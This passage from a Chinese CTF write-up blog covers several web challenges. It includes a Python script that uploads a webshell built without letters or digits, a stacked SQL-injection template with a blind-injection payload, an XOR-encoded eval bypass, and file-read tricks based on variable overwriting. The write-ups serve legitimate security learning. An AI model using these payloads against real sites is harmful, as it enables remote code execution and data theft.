            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token string">"name"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token operator">||</span> i <span class="token operator">===</span> <span class="token string">"award"</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token string">"want_to_eat"</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>want_to_eat<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                player <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            player<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token string">"want_to_eat"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">switch</span> <span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">case</span> <span class="token string">"1"</span> <span class="token punctuation">:</span>
                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Turkey"</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token string">"2"</span> <span class="token punctuation">:</span>
                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Goose"</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token string">"3"</span> <span class="token punctuation">:</span>
                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Buchedenoel"</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token string">"4"</span> <span class="token punctuation">:</span>
                        player<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Corn porridge"</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>
            id<span class="token punctuation">:</span> player<span class="token punctuation">.</span>want_to_eat<span class="token punctuation">,</span>
            is_win<span class="token punctuation">:</span> <span class="token string">"false"</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> env<span class="token punctuation">.</span>parsed<span class="token punctuation">.</span>rockyou<span class="token punctuation">,</span> <span class="token punctuation">{</span>
            expiresIn<span class="token punctuation">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">12</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> <span class="token punctuation">{</span>
        maxAge<span class="token punctuation">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">,</span>
        httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>要是能控制player的want_to_eat就好了<br>卡死了，不会</p>
<p>比赛结束了，不出我所料这个题是y1ng出的，这里没法控制want_to_eat，直接进行一个rockyou字典的爆破，说是说这个变量名叫rockyou提示的是这个字典，但是我不知道有这个字典啊。。。。感觉就硬多整一环，结果成了个脑洞</p>
<p>由于player处没有win这个属性，可以进行一个类似原型链污染的操作，通过直接修改单个对象的原型增加属性，可以硬加一个win属性上去，但是want_to_eat绝对无法控制，需要用它给的这个字典爆破jwt的secret，最后到一步SQL注入。。。</p>
<p>感觉这个题思路并不好，三个点难度都不大，没有特别惊艳的利用，就是简单堆叠套娃，然后这步爆破提示也给的有点诡异，就好端端的突然变成脑洞题卡住一堆人<br>研究字典怎么用去了</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>y1ng师傅的wp<br><a href="https://www.gem-love.com/ctf/2702.html">https://www.gem-love.com/ctf/2702.html</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>[SUCTF2018]GetShell</title>
    <url>/%5BSUCTF2018%5DGetShell.html</url>
    <content><![CDATA[<h1 id="SUCTF2018-GetShell"><a href="#SUCTF2018-GetShell" class="headerlink" title="[SUCTF2018]GetShell"></a>[SUCTF2018]GetShell</h1><p>SUCTF的老题了，无字母数字加符号限制的命令执行</p>
<p>点upload之后会有一个act&#x3D;upload，一开始以为有文件包含之类的，加目录伪协议试了半天，没太懂怎么回事，感觉是拼接了目录之后又限制了目录穿越，没有文件包含的机会了</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_char</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"illegal char"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>     
<span class="token punctuation">}</span> 
</code></pre>
<p>blacklist没给，自己fuzz一下，字母数字全禁，符号也就如下这几个能用<code>.[]=~$()_;</code>，测了一下ascii大于128的字符，都能用，而源码只有前五个字符不受限制，空格换行符也没有，上传上去的文件名不可控，但是会给一个php后缀，所以文件开头肯定是短标签&lt;?&#x3D;，这一点很好确定</p>
<p>给了取反符号，自然就是通过取反拼接字符串了，直接用<code>echo urlencode(~&#39;p&#39;)</code>这样子获取取反后的ascii码，然后再取反回来就可以了（大概<br>实际使用的时候发现总会在前面出现一个等于号，如下</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 0x8c对应的字符</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># =s</span>
</code></pre>
<p>所以还得取这个字符串的第二位<br>变量名可以直接叫$_，这样子很方便，然后通过弱类型转换，令$_&#x3D;[];$_&#x3D;$_&#x3D;&#x3D;$_，得到$_&#x3D;true，再弱类型变成1，作为数组下标，就可以获得对应的字母了</p>
<p>可以通过动态调用的形式来执行命令，比如令$__&#x3D;system,$___&#x3D;$_GET[a]，那么$__($___)就是system($_GET[a])<br>不过直接拼是不能拼出$_GET这种超全局变量的，需要先令$_&#x3D;_GET;$__&#x3D;$$_，这样子构造出来的$__就是超全局变量$_GET，再以数组形式访问$__[_]，等价于$_GET[_]</p>
<p><del>一开始想拼一个$_&#x3D;$_GET出来的，后来不知道为什么$符号怎么取反也取不到，最后发现根本不需要美元符号。。。</del></p>
<p>最后写了个垃圾脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://1a329468-4bf5-439b-b029-2a7dbfc3d37a.node3.buuoj.cn/index.php?act=upload"</span>

char_set <span class="token operator">=</span> <span class="token string">"\n ^,|./'[]=-~`!@#$%^&amp;*()_+{}:;\"?>&lt;"</span>

<span class="token comment" spellcheck="true"># 可用字符.[]=~$()_;</span>
payload <span class="token operator">=</span> <span class="token string">"&lt;?=$_=[];$_=$_==$_;$___"</span> <span class="token operator">+</span> <span class="token string">"=~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x8c</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x8c</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x9a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x92</span><span class="token punctuation">)</span> \
        <span class="token operator">+</span> <span class="token string">"[$_];$__=~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xba</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xab</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_];$_=$$__;$___($_[_]);"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span> <span class="token string">"Submit"</span><span class="token punctuation">}</span>
files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>最后执行命令的时候发现根目录下面的flag是个假flag，真flag在环境变量里面，?_&#x3D;env获取flag</p>
<p>拼超全局变量那个还是从P神博客里看的，看到这个题就想起p神提到过的这个无字母数字getshell<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>[SUCTF2018]anonymous</title>
    <url>/%5BSUCTF2018%5Danonymous.html</url>
    <content><![CDATA[<h1 id="SUCTF2018-anonymous"><a href="#SUCTF2018-anonymous" class="headerlink" title="[SUCTF2018]anonymous"></a>[SUCTF2018]anonymous</h1><p>SUCTF的老题，考的一个匿名函数</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$MY</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"die(`dir`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"function SUCTF_$hash(){"</span>
    <span class="token punctuation">.</span><span class="token string">"global \$MY;"</span>
    <span class="token punctuation">.</span><span class="token string">"\$MY();"</span>
    <span class="token punctuation">.</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func_name"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>创建一个匿名函数，然后使用eval再创建一个名字为随机字符串的函数调用我们的匿名函数<br>允许提交一个func_name去动态调用一个没参数的函数。</p>
<p>先看了眼phpinfo，一无所有，不过只能调用一个无参数函数肯定也没别的攻击方法了，要么预测hash值，要么想办法获取匿名函数值</p>
<p>查了一下这个openssl_random_pseudo_bytes，是一个安全的随机数算法，也没法预测什么的，32位硬爆破去碰也不太可能，那就只能先想办法看看这个匿名函数是不是有名字</p>
<p>本地var_dump了一下$GLOBALS，拿到了一些有趣的东西，hash值是一个很长的随机字符串，但是我们的这个变量$MY，拥有一个名字<code>\000lambda_1</code>，再用这个名字动态调用一下，的确能行<br>url编码一下变成<code>%00lambda_1</code>，打过去500了，没法执行， 本地试了好几次都没成功<br>最后又去搜wp怎么回事<br>匿名函数均有名字，名为<code>\000lambda_%d</code>，%d为该匿名函数是进程中第几个匿名函数，本地环境代码很正常匿名函数就这一个，线上可能是Apache起了很多个线程，导致有多个匿名函数吧？<br>解决方案也很简单，发包到burp的intruder模块里面跑一遍就可以了，最后在<code>\000lambda_6</code>处获得flag<br>还有一种做法是疯狂访问，让Apache启动新的进程，新的进程刚创建出来的话匿名函数的序号就是1了，不过对于稍微扫一扫就会429的buu平台恐怕行不通？</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>匿名函数</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU2019 Web4</title>
    <url>/%5BSWPU2019%5DWeb4.html</url>
    <content><![CDATA[<h1 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h1><p>buu上的一分题，说实话这个难度我是不相信它只有一分的</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>打开是一个登录框，简单测试发现添加单引号会出现一个PHP的报错，而不是MySQL的报错，存在注入点，但不可使用报错注入<br>测了半天，感觉有关键词屏蔽，但是无论如何返回值就三种，登录成功，登录失败，PHP报错。那想直接查询回显也没机会了，只能盲注，并且登录成功啥也不给呜呜呜。<br>简单测一下发现select，sleep，or，逗号，大小于号，井号还有些七七八八的盲注需要的东西都给禁用了，但是另一个注释符–还能用，最主要的是回显根本没有帮助，完全不知道后台到底在干什么。<br>后来拿到源码之后看见了超级过滤<code>select|information|insert|union|ascii|,|like|outfile|join|&lt;|&gt;|and|substr|#|or|\|\||sleep|benchmark|if|&amp;&amp;</code><br>最后看wp说是堆叠注入，并且使用预处理将语句变为16进制表示，直接绕过超级过滤</p>
<h3 id="MySQL堆叠注入预处理"><a href="#MySQL堆叠注入预处理" class="headerlink" title="MySQL堆叠注入预处理"></a>MySQL堆叠注入预处理</h3><p>思路是输入分号后返回的是登录失败而不是PHP报错，判断能够执行堆叠注入<br>预处理可以使转换为16进制的MySQL语句被执行<br><code>1&#39;;set @a=0x&#123;0&#125;prepare payload from @a;execute payload-- </code><br>a的内容用常规时间盲注脚本跑就可以了<br>注意这里数据是用json格式提交的，记得把数据转换一下json格式<br>贴一个常见payload<br><code>select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)</code></p>
<p>一直注到最后会看见一个叫赵总想要一个女朋友的zip，下载下来就是源码</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>index.php里面指明了Common文件夹里面的内容，只有fun.php有实际内容，写明了对r参数的解析</p>
<pre class=" language-php"><code class="language-php">    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
    <span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token string">"{$controller}Controller"</span><span class="token punctuation">;</span>
    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string">"action{$action}"</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>就是前面半边是controller，后半边是action，如果存在对应的controller和action就调用对应的controller类下的action方法<br>接下来看controller类，登录类毫无作用，就是返回之前注入时的写死的回显<br>在basecontroller类中发现函数loadView</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token punctuation">.</span> <span class="token string">"/View/{$viewName}.php"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">viewPath</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>有一句<code>include $this-&gt;viewPath;</code>，且viewPath似乎可控，继续看看。可惜看完了所有loadView函数的调用，它的<code>$viewPath</code>都是写死的，但是这里还有一句<code>extract($viewData);</code>如果<code>$viewData</code>可控，也可以进行变量覆盖<br>在UserController中发现<code>actionIndex()</code>函数</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token string">'userIndex'</span><span class="token punctuation">,</span><span class="token variable">$listData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>其中的<code>$listData</code>完全可控，本来想直接覆盖$this-&gt;viewPath，后来想起来怎么可能覆盖类的私有成员变量，只得作罢。<br>那就只能看看我们老老实实包含的页面有什么东西了，userIndex.php就实现了一个功能，返回一个文件的base64编码，而文件路径$img_file刚好可以通过$_REQUEST来覆盖，这样一来我们就能直接获得flag.php的base64编码，获取flag了。<br>userIndex.php</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token string">'/../favicon.ico'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span>
<span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">'&lt;img src="'</span> <span class="token punctuation">.</span> <span class="token variable">$img_base64</span> <span class="token punctuation">.</span> <span class="token string">'">'</span><span class="token punctuation">;</span>
</code></pre>
<h4 id="小坑点"><a href="#小坑点" class="headerlink" title="小坑点"></a>小坑点</h4><p><code>dirname(__FILE__)</code>返回的是该文件的目录位置，所以是&#x2F;var&#x2F;www&#x2F;html&#x2F;View，并且目录没有一个斜杠结尾。所以最后试了半天<code>r=../flag.php</code>没有回显，又想不出来到底哪错了。。。</p>
<p>感觉吧第二个点引导的东西很直接，也不难，但是开局那个SQL注入的回显真的是恶心死人了，太难了呜呜呜</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF2019 ezweb</title>
    <url>/%5BSUCTF2019%5D%20ezphp.html</url>
    <content><![CDATA[<h1 id="SUCTF2019-ezweb"><a href="#SUCTF2019-ezweb" class="headerlink" title="SUCTF2019 ezweb"></a>SUCTF2019 ezweb</h1><p>BUU平台上复现题目，主要学习了一下异或绕过的操作还踩了一些奇奇怪怪的坑，题目共三层，层层绕过搞了我好几天，还是太菜了</p>
<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p>第一层源码</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F];+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p><strong>PS：不可见字符全部以十六进制编码的方式进行了展示，复现时需注意（因为url编码hexo要报错）</strong></p>
<p>PHP特性”Use of undeﬁned constant”会将代码中没有引号的字符默认为字符串，因此我们$_GET过去的数据也都被认为是字符串<br>又ASCII大于0x7F的字符都会被认为是字符串，因此在过滤了全部字母和数字的情况下，我们还可以用不可见字符进行异或或者取反来得到需要的内容<br>这里取反也挂了，所以用异或，同时异或%FF就等于取反，并且%FF还相对节约了一个字符，如果可行也不需要太麻烦的fuzz测试去找怎么异或，思路是再搞一个$_GET来绕过之前的一大堆限制，这里_GET的参数要是之前用来异或过的内容，节约字符串<br>$_GET[];的中括号也挂了，这个用大括号直接替代也没有问题,构造出如下payload并成功执行，第一层就算过了<br><code>?_=$&#123;0xfe0xfe0xfe0xfe^0xa10xb90xbb0xaa&#125;&#123;0xfe&#125;();&amp;0xfe=phpinfo </code><br>这里整体payload作为被默认作为了一个字符串进入eval函数，而eval函数将整个字符串作为代码执行，其中ASCII大于0x7f的不可见字符又会被认作字符串进行异或，最终得出我们想要的结果</p>
<p>实际上异或能凑的不同字符数这么少不容易，如果不行就得fuzz所有组合眼睛看的去找了</p>
<h3 id="第一个坑"><a href="#第一个坑" class="headerlink" title="第一个坑"></a>第一个坑</h3><p>wp中payload为<code>?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=phpinfo</code><br>这里_GET也需用大括号括起来，因为eval在执行过程中，如果遇到了$符号，则直接将后续部分任务是变量名，这样我们就得到了一个名为<code>$&#123;0xfe0xfe0xfe0xfe^0xa10xb90xbb0xaa&#125;</code>的变量，不去计算异或，然后产生错误退出，添加大括号之后使得我们先执行大括号中的内容，将异或后的_GET拿了出来，才能得到正确的结果</p>
<h3 id="第二个坑"><a href="#第二个坑" class="headerlink" title="第二个坑"></a>第二个坑</h3><p>本地测试<br><code>eval($_GET[&#39;a&#39;];);</code>时<br>当<code>?a=$_GET[b]();&amp;b=phpinfo</code>时能正常执行，而<code>?a=$_GET[b];&amp;b=phpinfo();</code>试了半天。。。。不会调试的我也太菜了。<br>就是当一个变量以$a()的形式出现的时候，PHP会认为它是一个函数，从而eval就会执行phpinfo();这个函数，如果我们以后者的方式进行执行，就只是一个$_GET[b];，得到了一个内容为<code>phpinfo();</code>的字符串，存在$_GET这个全局变量里面</p>
<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p>第一层过了之后可以执行的get_the_flag函数</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>
